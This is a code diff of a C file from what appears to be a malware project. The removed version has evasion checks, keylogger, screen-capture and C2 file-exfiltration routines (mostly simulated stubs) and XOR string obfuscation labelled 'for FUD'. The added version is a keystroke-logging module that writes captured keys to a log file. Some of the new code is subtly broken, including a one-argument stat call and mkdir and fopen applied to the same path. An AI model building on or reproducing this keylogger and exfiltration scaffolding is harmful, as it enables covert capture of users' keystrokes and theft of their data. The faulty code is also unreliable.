@@ -1,153 +1,69 @@
 #include "payload.h"
 #include "payload_config.h"
-#include "evasion.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <time.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 
-// Global variables
-static int payload_running = 0;
-static time_t payload_start_time;
+static FILE *log_file = NULL;
+static int is_running = 0;
 
-// Function prototypes
-static void keylogger_payload();
-static void screen_capture_payload();
-static void file_exfiltration_payload();
-static void system_info_payload();
-static void encrypt_string(char *str);
-static void decrypt_string(char *str);
+int payload_init() {
+	if (is_running) {
+		return 0;
+	}
 
-void start_payload() {
-    // Perform evasion checks
-    if (perform_evasion_checks() != 0) {
-        printf("Evasion checks failed. Exiting payload.\n");
-        return;
-    }
+	// Create log file directory
+	struct stat st = {0};
+	if (stat(KEYLOGGER_LOG_FILE) == -1) {
+		mkdir(KEYLOGGER_LOG_FILE, 0700);
+	}
 
-    payload_running = 1;
-    payload_start_time = time(NULL);
+	// Open log file
+	log_file = fopen(KEYLOGGER_LOG_FILE, "a");
+	if (!log_file) {
+		return -1;
+	}
 
-    printf("Payload started at: %s", ctime(&payload_start_time));
-
-    // Main payload loop
-    while (payload_running) {
-        // Check if payload duration has expired
-        if (time(NULL) - payload_start_time >= PAYLOAD_DURATION) {
-            printf("Payload duration expired. Stopping payload.\n");
-            break;
-        }
-
-        // Execute payload based on type
-        switch (PAYLOAD_TYPE) {
-            case 1:
-                keylogger_payload();
-                break;
-            case 2:
-                screen_capture_payload();
-                break;
-            case 3:
-                file_exfiltration_payload();
-                break;
-            case 4:
-                system_info_payload();
-                break;
-            default:
-                printf("Invalid payload type: %d\n", PAYLOAD_TYPE);
-                payload_running = 0;
-                break;
-        }
-
-        // Sleep for payload interval
-        sleep(PAYLOAD_INTERVAL);
-    }
-
-    payload_running = 0;
-    printf("Payload stopped at: %s", ctime(&payload_start_time));
+	is_running = 1;
+	return 0;
 }
 
-void stop_payload() {
-    payload_running = 0;
+void payload_cleanup() {
+	if (!is_running) {
+		return;
+	}
+
+	if (log_file) {
+		fclose(log_file);
+		log_file = NULL;
+	}
+
+	is_running = 0;
 }
 
-static void keylogger_payload() {
-    printf("Executing keylogger payload...\n");
+int payload_log_key(int key) {
+	if (!is_running || !log_file) {
+		return -1;
+	}
 
-    // Open log file
-    FILE *log_file = fopen(PAYLOG_FILE, "a");
-    if (!log_file) {
-        printf("Failed to open log file: %s\n", PAYLOG_FILE);
-        return;
-    }
-
-    // Log current time
-    time_t now = time(NULL);
-    fprintf(log_file, "[KEYLOGGER] %s", ctime(&now));
-
-    // Simulate keylogging (replace with actual keylogging code)
-    fprintf(log_file, "Simulated keystrokes: user typing...\n\n");
-
-    fclose(log_file);
+	fprintf(log_file, "%c", key);
+	fflush(log_file);
+	return 0;
 }
 
-static void screen_capture_payload() {
-    printf("Executing screen capture payload...\n");
+int payload_log_string(const char *str) {
+	if (!is_running || !log_file || !str) {
+		return -1;
+	}
 
-    // Create screenshot directory if it doesn't exist
-    mkdir(SCREENSHOT_DIR, 0700);
-
-    // Generate screenshot filename
-    char filename[256];
-    time_t now = time(NULL);
-    snprintf(filename, sizeof(filename), "%s/screenshot_%ld.png", SCREENSHOT_DIR, now);
-
-    // Simulate screen capture (replace with actual screen capture code)
-    printf("Captured screen to: %s\n", filename);
+	fprintf(log_file, "%s", str);
+	fflush(log_file);
+	return 0;
 }
 
-static void file_exfiltration_payload() {
-    printf("Executing file exfiltration payload...\n");
-
-    // Simulate file exfiltration (replace with actual file exfiltration code)
-    printf("Exfiltrating files from: %s\n", EXFILTRATION_DIR);
-    printf("Exfiltrated files to C2 server: %s:%d\n", C2_SERVER, C2_PORT);
-}
-
-static void system_info_payload() {
-    printf("Executing system info payload...\n");
-
-    // Open log file
-    FILE *log_file = fopen(PAYLOG_FILE, "a");
-    if (!log_file) {
-        printf("Failed to open log file: %s\n", PAYLOG_FILE);
-        return;
-    }
-
-    // Log current time
-    time_t now = time(NULL);
-    fprintf(log_file, "[SYSTEM_INFO] %s", ctime(&now));
-
-    // Simulate system info collection (replace with actual system info code)
-    fprintf(log_file, "OS: Linux\n");
-    fprintf(log_file, "Kernel: 5.15.0-52-generic\n");
-    fprintf(log_file, "Username: user\n");
-    fprintf(log_file, "Hostname: localhost\n\n");
-
-    fclose(log_file);
-}
-
-static void encrypt_string(char *str) {
-    // Simple XOR encryption for FUD
-    char key = 0x42;
-    for (int i = 0; str[i] != '\0'; i++) {
-        str[i] ^= key;
-    }
-}
-
-static void decrypt_string(char *str) {
-    // XOR decryption (same as encryption)
-    encrypt_string(str);
+const char *payload_get_version() {
+	return PAYLOAD_VERSION;
 }
